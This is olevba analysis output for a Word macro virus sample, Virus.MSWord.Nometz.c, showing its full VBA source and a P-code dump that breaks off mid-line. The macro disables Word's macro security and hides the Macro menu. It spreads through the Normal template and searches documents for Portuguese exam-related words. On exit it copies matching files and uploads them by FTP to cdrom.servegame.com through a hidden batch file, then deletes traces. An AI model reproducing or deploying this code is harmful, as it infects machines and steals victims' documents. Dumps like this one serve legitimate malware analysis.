olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Nometz.c
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Nometz.c - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO cdrom.bas 
in file: Virus.MSWord.Nometz.c - OLE stream: 'Macros/VBA/cdrom'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub autoopen()
Dim x
On Error Resume Next
ChangeFileOpenDirectory "C:\Meus documentos\"
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security", "AccessVBOM") = 1
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security", "DontTrustInstalledFiles") = 0
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security", "Level") = 1
nor = False
doc = False
nm = "cdrom"
Application.ScreenUpdating = 0
Application.EnableCancelKey = 0
ActiveDocument.ReadOnlyRecommended = 0
Options.VirusProtection = 0
Options.SaveNormalPrompt = 0
CommandBars("tools").Controls("Macro").Visible = False
ShowVisualBasicEditor = False
sv = Chr(Int(Rnd) + 1 * 165 + 35 - 101) + ":" + Chr(Int(Rnd) + 1 * 165 + 35 - 108)
c1 = Chr(119) + Chr(105) + Chr(110) + Chr(100) + Chr(111) + Chr(119) + Chr(115) + Chr(92) + Chr(99) + Chr(111) + Chr(111) + Chr(107) + Chr(105) + Chr(101) + Chr(115) + Chr(92)
If ActiveDocument.VBProject.VBComponents.Count > 0 Then
For i = 1 To ActiveDocument.VBProject.VBComponents.Count
  If ActiveDocument.VBProject.VBComponents.Item(i).Name = nm Then doc = True
 Next
End If

 For Each VbComponent In NormalTemplate.VBProject.VBComponents

      If VbComponent.Name = nm Then nor = True

  Next
  
If nor = False Then
Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:=nm, Object:=wdOrganizerObjectProjectItems
End If
 If Dir(sv + c1 + nm + ".dot") = "" Then
    cx = ActiveDocument.Path
    c2 = ActiveDocument.FullName
    ActiveDocument.SaveAs sv + c1 + nm, AddToRecentFiles:=False, FileFormat:=wdFormatTemplate
    Documents.Open FileName:=c2
    Documents(c2).Activate
             For i = 1 To RecentFiles.Count
         If i < RecentFiles.Count + 1 Then
          If Right(RecentFiles(i).Name, 3) = "dot" Then
          nome = Chr(Int(Rnd) + 1 * 165 + 35 - 101) + ":" + Chr(Int(Rnd) + 1 * 165 + 35 - 108) + Chr(119) + Chr(105) + Chr(110) + Chr(100) + Chr(111) + Chr(119) + Chr(115) + Chr(92) + "recent" + Chr(92) + RecentFiles(i).Name + ".lnk"
             If Dir(nome) <> "" Then Kill nome
          RecentFiles(i).Delete
          End If
         End If
         Next
    Documents(sv + c1 + nm + ".dot").Close
 End If

If doc = False Then
Application.OrganizerCopy Source:=(sv + c1 + nm + ".dot"), Destination:=ActiveDocument.FullName, Name:=nm, Object:=wdOrganizerObjectProjectItems
End If

mySearchString = "Pr" + Chr(111) + Chr(118) + Chr(97)
With Selection.Find
    .Text = mySearchString
    .MatchCase = False
    .MatchWholeWord = False
    If .Execute = True Then x = 6
End With
If x < 6 Then
  mySearchString = Chr(97) + "v" + Chr(97) + "li" + Chr(97) + "çã" + Chr(111)
With Selection.Find
    .Text = mySearchString
    .MatchCase = False
    .MatchWholeWord = False
    If .Execute = True Then x = 6
End With
End If
If x < 6 Then
  mySearchString = "c" + Chr(111) + "p" + Chr(101) + "v" + Chr(101)
With Selection.Find
    .Text = mySearchString
    .MatchCase = False
    .MatchWholeWord = False
    If .Execute = True Then x = 6
End With
End If
If x < 6 Then
mySearchString = "c" + Chr(111) + "ncu" + Chr(114) + "s" + Chr(111)
With Selection.Find
    .Text = mySearchString
    .MatchCase = False
    .MatchWholeWord = False
    If .Execute = True Then x = 6
End With
End If
If x < 6 Then
    mySearchString = Chr(101) + "xc" + Chr(101) + "t" + Chr(111)
With Selection.Find
    .Text = mySearchString
    .MatchCase = False
    .MatchWholeWord = False
    If .Execute = True Then x = 6
End With
End If
If x < 6 Then
    mySearchString = Chr(101) + "x" + Chr(97) + "m" + Chr(101)
With Selection.Find
    .Text = mySearchString
    .MatchCase = False
    .MatchWholeWord = False
    If .Execute = True Then x = 6
End With
End If
    Selection.GoTo What:=wdGoToPage, Which:=wdGoToNext, Name:="1"
    Selection.Find.ClearFormatting
    With Selection.Find
        .Text = ""
        .Replacement.Text = ""
        .Forward = True
        .Wrap = wdFindContinue
        .Format = False
        .MatchCase = False
        .MatchWholeWord = False
        .MatchWildcards = False
        .MatchSoundsLike = False
        .MatchAllWordForms = False
    End With
c1 = Chr(119) + Chr(105) + Chr(110) + Chr(100) + Chr(111) + Chr(119) + Chr(115) + Chr(92) + Chr(99) + Chr(111) + Chr(111) + Chr(107) + Chr(105) + Chr(101) + Chr(115) + Chr(92)
sv = Chr(Int(Rnd) + 1 * 165 + 35 - 101) + ":" + Chr(Int(Rnd) + 1 * 165 + 35 - 108)
 sn = Left(ActiveDocument.Name, Len(ActiveDocument.Name) - 3) + "j" + Chr(112) + "g"
 s2 = ActiveDocument.Name
 If x = 6 And ActiveDocument.Saved And Dir(sv + c1 + sn) = "" Then
    cx = ActiveDocument.Path
    c2 = ActiveDocument.FullName
    ActiveDocument.SaveAs sv + c1 + sn, AddToRecentFiles = False
    Documents.Open FileName:=c2
    Documents(c2).Activate
    Documents(sv + c1 + sn).Close
    nome = Chr(Int(Rnd) + 1 * 165 + 35 - 101) + ":" + Chr(Int(Rnd) + 1 * 165 + 35 - 108) + Chr(119) + Chr(105) + Chr(110) + Chr(100) + Chr(111) + Chr(119) + Chr(115) + Chr(92) + "recent" + Chr(92) + s2 + ".lnk"
    If Dir(nome) <> "" Then Kill nome
     End If
         For i = 1 To RecentFiles.Count
         If i < RecentFiles.Count + 1 Then
       If Right(RecentFiles(i).Name, 3) = "j" + Chr(112) + "g" Then
        nome = Chr(Int(Rnd) + 1 * 165 + 35 - 101) + ":" + Chr(Int(Rnd) + 1 * 165 + 35 - 108) + Chr(119) + Chr(105) + Chr(110) + Chr(100) + Chr(111) + Chr(119) + Chr(115) + Chr(92) + "recent" + Chr(92) + RecentFiles(i).Name + ".lnk"
       RecentFiles(i).Delete
     If Dir(nome) <> "" Then Kill nome
       End If
       End If
    Next

End Sub
Sub autoclose()
On Error Resume Next
         For i = 1 To RecentFiles.Count
         If i < RecentFiles.Count + 1 Then
       If Right(RecentFiles(i).Name, 3) = "j" + Chr(112) + "g" Or Right(RecentFiles(i).Name, 3) = "dot" Then
       nome = Chr(Int(Rnd) + 1 * 165 + 35 - 101) + ":" + Chr(Int(Rnd) + 1 * 165 + 35 - 108) + Chr(119) + Chr(105) + Chr(110) + Chr(100) + Chr(111) + Chr(119) + Chr(115) + Chr(92) + "recent" + Chr(92) + RecentFiles(i).Name + ".lnk"
       RecentFiles(i).Delete
       If Dir(nome) <> "" Then Kill nome
       End If
       End If
    Next

End Sub
Sub autoexit()
On Error Resume Next
sv = Chr(Int(Rnd) + 1 * 165 + 35 - 101) + ":" + Chr(Int(Rnd) + 1 * 165 + 35 - 108)
sn = sv + c1 + Chr(99) + Chr(Int(Rnd(1) * 10 + 80)) + Chr(97 + 2 + 1) + "." + Chr(98) + Chr(97) + Chr(116)
c1 = Chr(119) + Chr(105) + Chr(110) + Chr(100) + Chr(111) + Chr(119) + Chr(115) + Chr(92) + Chr(99) + Chr(111) + Chr(111) + Chr(107) + Chr(105) + Chr(101) + Chr(115) + Chr(92)

s1 = sv + c1 + Chr(99) + Chr(Int(Rnd(1) * 10 + 80)) + Chr(97 + 2 + 1) + "." + Chr(102) + Chr(116) + Chr(112)

 If Dir(sv + c1 + Chr(42) + ".j" + Chr(112) + "g") <> "" Then
        Open s1 For Output As #1
    Print #1, "o " + Chr(99) + "dr" + Chr(111) + Chr(109) + "." + Chr(115) + Chr(101) + "rvegame" + Chr(46) + Chr(99) + "om"
    Print #1, "us" + Chr(101) + "r n" + Chr(111) + "vat" + Chr(111) + "  " + Chr(99) + "drom"
    Print #1, "binary"
    Print #1, Chr(112) + "ut " + sv + c1 + Chr(42) + ".j" + Chr(112) + "g"
    Print #1, "q" + Chr(117) + Chr(105) + "t"
    Close #1
    
         Open sn For Output As #1
    Print #1, "f" + Chr(116) + "p" + Chr(46) + Chr(101) + "x" + Chr(101) + " -n -s:" + s1
    Print #1, Chr(103 - 3) + "el " + sv + c1 + Chr(42) + ".j" + Chr(112) + "g"
    Print #1, "del " + s1
    Print #1, "del " + sn
    Close #1
        Shell sn, vbHide
        
End If
       nome = Chr(Int(Rnd) + 1 * 165 + 35 - 101) + ":" + Chr(Int(Rnd) + 1 * 165 + 35 - 108) + Chr(119) + Chr(105) + Chr(110) + Chr(100) + Chr(111) + Chr(119) + Chr(115) + Chr(92) + "recent" + Chr(92) + "cdrom" + ".dot" + ".lnk"
       If Dir(nome) <> "" Then Kill nome
       nome = Chr(Int(Rnd) + 1 * 165 + 35 - 101) + ":" + Chr(Int(Rnd) + 1 * 165 + 35 - 108) + Chr(119) + Chr(105) + Chr(110) + Chr(100) + Chr(111) + Chr(119) + Chr(115) + Chr(92) + "recent" + Chr(92) + "*jpg.lnk"
       Do While Dir("c:\windows\recent\*jpg.lnk") <> ""
        ffile = Dir(nome)
        vv1 = "c:\windows\recent\" + ffile
        Kill vv1

        Loop
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Nometz.c
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 1190 bytes
' Macros/VBA/cdrom - 19999 bytes
' Line #0:
' 	FuncDefn (Sub autoopen())
' Line #1:
' 	Dim 
' 	VarDefn x
' Line #2:
' 	OnError (Resume Next) 
' Line #3:
' 	LitStr 0x0013 "C:\Meus documentos\"
' 	ArgsCall ChangeFileOpenDirectory 0x0001 
' Line #4:
' 	LitDI2 0x0001 
' 	LitStr 0x0000 ""
' 	LitStr 0x003E "HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security"
' 	LitStr 0x000A "AccessVBOM"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #5:
' 	LitDI2 0x0000 
' 	LitStr 0x0000 ""
' 	LitStr 0x003E "HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security"
' 	LitStr 0x0017 "DontTrustInstalledFiles"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #6:
' 	LitDI2 0x0001 
' 	LitStr 0x0000 ""
' 	LitStr 0x003E "HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security"
' 	LitStr 0x0005 "Level"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #7:
' 	LitVarSpecial (False)
' 	St nor 
' Line #8:
' 	LitVarSpecial (False)
' 	St doc 
' Line #9:
' 	LitStr 0x0005 "cdrom"
' 	St nm 
' Line #10:
' 	LitDI2 0x0000 
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #11:
' 	LitDI2 0x0000 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #12:
' 	LitDI2 0x0000 
' 	Ld ActiveDocument 
' 	MemSt ReadOnlyRecommended 
' Line #13:
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #14:
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #15:
' 	LitVarSpecial (False)
' 	LitStr 0x0005 "Macro"
' 	LitStr 0x0005 "tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Visible 
' Line #16:
' 	LitVarSpecial (False)
' 	St ShowVisualBasicEditor 
' Line #17:
' 	Ld Rnd 
' 	FnInt 
' 	LitDI2 0x0001 
' 	LitDI2 0x00A5 
' 	Mul 
' 	Add 
' 	LitDI2 0x0023 
' 	Add 
' 	LitDI2 0x0065 
' 	Sub 
' 	ArgsLd Chr 0x0001 
' 	LitStr 0x0001 ":"
' 	Add 
' 	Ld Rnd 
' 	FnInt 
' 	LitDI2 0x0001 
' 	LitDI2 0x00A5 
' 	Mul 
' 	Add 
' 	LitDI2 0x0023 
' 	Add 
' 	LitDI2 0x006C 
' 	Sub 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St sv 
' Line #18:
' 	LitDI2 0x0077 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0064 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0077 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0073 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006B 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0073 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St c1 
' Line #19:
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #20:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #21:
' 	Ld i 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd New 
' 	Ld nm 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St doc 
' 	EndIf 
' Line #22:
' 	StartForVariable 
' 	Next 
' Line #23:
' 	EndIfBlock 
' Line #24:
' Line #25:
' 	StartForVariable 
' 	Ld VbComponent 
' 	EndForVariable 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #26:
' Line #27:
' 	Ld VbComponent 
' 	MemLd New 
' 	Ld nm 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St nor 
' 	EndIf 
' Line #28:
' Line #29:
' 	StartForVariable 
' 	Next 
' Line #30:
' Line #31:
' 	Ld nor 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #32:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	Ld nm 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #33:
' 	EndIfBlock 
' Line #34:
' 	Ld sv 
' 	Ld c1 
' 	Add 
' 	Ld nm 
' 	Add 
' 	LitStr 0x0004 ".dot"
' 	Add 
' 	ArgsLd Dir 0x0001 
' 	LitStr 0x0000 ""
' 	Eq 
' 	IfBlock 
' Line #35:
' 	Ld ActiveDocument 
' 	MemLd Path 
' 	St cx 
' Line #36:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	St c2 
' Line #37:
' 	Ld sv 
' 	Ld c1 
' 	Add 
' 	Ld nm 
' 	Add 
' 	LitVarSpecial (False)
' 	ParamNamed AddToRecentFiles 
' 	Ld wdFormatTemplate 
' 	ParamNamed FileFormat 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0003 
' Line #38:
' 	Ld c2 
' 	ParamNamed FileName 
' 	Ld Documents 
' 	ArgsMemCall Option 0x0001 
' Line #39:
' 	Ld c2 
' 	ArgsLd Documents 0x0001 
' 	ArgsMemCall Activate 0x0000 
' Line #40:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld RecentFiles 
' 	MemLd Count 
' 	For 
' Line #41:
' 	Ld i 
' 	Ld RecentFiles 
' 	MemLd Count 
' 	LitDI2 0x0001 
' 	Add 
' 	Lt 
' 	IfBlock 
' Line #42:
' 	Ld i 
' 	ArgsLd RecentFiles 0x0001 
' 	MemLd New 
' 	LitDI2 0x0003 
' 	ArgsLd Right 0x0002 
' 	LitStr 0x0003 "dot"
' 	Eq 
' 	IfBlock 
' Line #43:
' 	Ld Rnd 
' 	FnInt 
' 	LitDI2 0x0001 
' 	LitDI2 0x00A5 
' 	Mul 
' 	Add 
' 	LitDI2 0x0023 
' 	Add 
' 	LitDI2 0x0065 
' 	Sub 
' 	ArgsLd Chr 0x0001 
' 	LitStr 0x0001 ":"
' 	Add 
' 	Ld Rnd 
' 	FnInt 
' 	LitDI2 0x0001 
' 	LitDI2 0x00A5 
' 	Mul 
' 	Add 
' 	LitDI2 0x0023 
' 	Add 
' 	LitDI2 0x006C 
' 	Sub 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0077 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0064 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0077 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0073 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0006 "recent"
' 	Add 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld i 
' 	ArgsLd RecentFiles 0x0001 
' 	MemLd New 
' 	Add 
' 	LitStr 0x0004 ".lnk"
' 	Add 
' 	St nome 
' Line #44:
' 	Ld nome 
' 	ArgsLd Dir 0x0001 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld nome 
' 	ArgsCall Kill 0x0001 
' 	EndIf 
' Line #45:
' 	Ld i 
' 	ArgsLd RecentFiles 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #46:
' 	EndIfBlock 
' Line #47:
' 	EndIfBlock 
' Line #48:
' 	StartForVariable 
' 	Next 
' Line #49:
' 	Ld sv 
' 	Ld c1 
' 	Add 
' 	Ld nm 
' 	Add 
' 	LitStr 0x0004 ".dot"
' 	Add 
' 	ArgsLd Documents 0x0001 
' 	ArgsMemCall Close 0x0000 
' Line #50:
' 	EndIfBlock 
' Line #51:
' Line #52:
' 	Ld doc 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #53:
' 	Ld sv 
' 	Ld c1 
' 	Add 
' 	Ld nm 
' 	Add 
' 	LitStr 0x0004 ".dot"
' 	Add 
' 	Paren 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	Ld nm 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #54:
' 	EndIfBlock 
' Line #55:
' Line #56:
' 	LitStr 0x0002 "Pr"
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0076 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St mySearchString 
' Line #57:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Find 
' 	With 
' Line #58:
' 	Ld mySearchString 
' 	MemStWith Then 
' Line #59:
' 	LitVarSpecial (False)
' 	MemStWith MatchCase 
' Line #60:
' 	LitVarSpecial (False)
' 	MemStWith MatchWholeWord 
' Line #61:
' 	MemLdWith Execute 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0006 
' 	St x 
' 	EndIf 
' Line #62:
' 	EndWith 
' Line #63:
' 	Ld x 
' 	LitDI2 0x0006 
' 	Lt 
' 	IfBlock 
' Line #64:
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	LitStr 0x0001 "v"
' 	Add 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "li"
' 	Add 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "çã"
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St mySearchString 
' Line #65:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Find 
' 	With 
' Line #66:
' 	Ld mySearchString 
' 	MemStWith Then 
' Line #67:
' 	LitVarSpecial (False)
' 	MemStWith MatchCase 
' Line #68:
' 	LitVarSpecial (False)
' 	MemStWith MatchWholeWord 
' Line #69:
' 	MemLdWith Execute 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0006 
' 	St x 
' 	EndIf 
' Line #70:
' 	EndWith 
' Line #71:
' 	EndIfBlock 
' Line #72:
' 	Ld x 
' 	LitDI2 0x0006 
' 	Lt 
' 	IfBlock 
' Line #73:
' 	LitStr 0x0001 "c"
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "p"
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "v"
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St mySearchString 
' Line #74:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Find 
' 	With 
' Line #75:
' 	Ld mySearchString 
' 	MemStWith Then 
' Line #76:
' 	LitVarSpecial (False)
' 	MemStWith MatchCase 
' Line #77:
' 	LitVarSpecial (False)
' 	MemStWith MatchWholeWord 
' Line #78:
' 	MemLdWith Execute 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0006 
' 	St x 
' 	EndIf 
' Line #79:
' 	EndWith 
' Line #80:
' 	EndIfBlock 
' Line #81:
' 	Ld x 
' 	LitDI2 0x0006 
' 	Lt 
' 	IfBlock 
' Line #82:
' 	LitStr 0x0001 "c"
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "ncu"
' 	Add 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "s"
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St mySearchString 
' Line #83:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Find 
' 	With 
' Line #84:
' 	Ld mySearchString 
' 	MemStWith Then 
' Line #85:
' 	LitVarSpecial (False)
' 	MemStWith MatchCase 
' Line #86:
' 	LitVarSpecial (False)
' 	MemStWith MatchWholeWord 
' Line #87:
' 	MemLdWith Execute 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0006 
' 	St x 
' 	EndIf 
' Line #88:
' 	EndWith 
' Line #89:
' 	EndIfBlock 
' Line #90:
' 	Ld x 
' 	LitDI2 0x0006 
' 	Lt 
' 	IfBlock 
' Line #91:
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	LitStr 0x0002 "xc"
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "t"
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St mySearchString 
' Line #92:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Find 
' 	With 
' Line #93:
' 	Ld mySearchString 
' 	MemStWith Then 
' Line #94:
' 	LitVarSpecial (False)
' 	MemStWith MatchCase 
' Line #95:
' 	LitVarSpecial (False)
' 	MemStWith MatchWholeWord 
' Line #96:
' 	MemLdWith Execute 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0006 
' 	St x 
' 	EndIf 
' Line #97:
' 	EndWith 
' Line #98:
' 	EndIfBlock 
' Line #99:
' 	Ld x 
' 	LitDI2 0x0006 
' 	Lt 
' 	IfBlock 
' Line #100:
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	LitStr 0x0001 "x"
' 	Add 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "m"
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St mySearchString 
' Line #101:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Find 
' 	With 
' Line #102:
' 	Ld mySearchString 
' 	MemStWith Then 
' Line #103:
' 	LitVarSpecial (False)
' 	MemStWith MatchCase 
' Line #104:
' 	LitVarSpecial (False)
' 	MemStWith MatchWholeWord 
' Line #105:
' 	MemLdWith Execute 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0006 
' 	St x 
' 	EndIf 
' Line #106:
' 	EndWith 
' Line #107:
' 	EndIfBlock 
' Line #108:
' 	Ld wdGoToPage 
' 	ParamNamed What 
' 	Ld wdGoToNext 
' 	ParamNamed Which 
' 	LitStr 0x0001 "1"
' 	ParamNamed New 
' 	Ld Selection 
' 	ArgsMemCall If 0x0003 
' Line #109:
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #110:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Find 
' 	With 
' Line #111:
' 	LitStr 0x0000 ""
' 	MemStWith Then 
' Line #112:
' 	LitStr 0x0000 ""
' 	MemLdWith Replacement 
' 	MemSt Then 
' Line #113:
' 	LitVarSpecial (True)
' 	MemStWith Forward 
' Line #114:
' 	Ld wdFindContinue 
' 	MemStWith Wrap 
' Line #115:
' 	LitVarSpecial (False)
' 	MemStWith Format$ 
' Line #116:
' 	LitVarSpecial (False)
' 	MemStWith MatchCase 
' Line #117:
' 	LitVarSpecial (False)
' 	MemStWith MatchWholeWord 
' Line #118:
' 	LitVarSpecial (False)
' 	MemStWith MatchWildcards 
' Line #119:
' 	LitVarSpecial (False)
' 	MemStWith MatchSoundsLike 
' Line #120:
' 	LitVarSpecial (False)
' 	MemStWith MatchAllWordForms 
' Line #121:
' 	EndWith 
' Line #122:
' 	LitDI2 0x0077 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0064 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0077 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0073 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006B 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0073 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St c1 
' Line #123:
' 	Ld Rnd 
' 	FnInt 
' 	LitDI2 0x0001 
' 	LitDI2 0x00A5 
' 	Mul 
' 	Add 
' 	LitDI2 0x0023 
' 	Add 
' 	LitDI2 0x0065 
' 	Sub 
' 	ArgsLd Chr 0x0001 
' 	LitStr 0x0001 ":"
' 	Add 
' 	Ld Rnd 
' 	FnInt 
' 	LitDI2 0x0001 
' 	LitDI2 0x00A5 
' 	Mul 
' 	Add 
' 	LitDI2 0x0023 
' 	Add 
' 	LitDI2 0x006C 
' 	Sub 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St sv 
' Line #124:
' 	Ld ActiveDocument 
' 	MemLd New 
' 	Ld ActiveDocument 
' 	MemLd New 
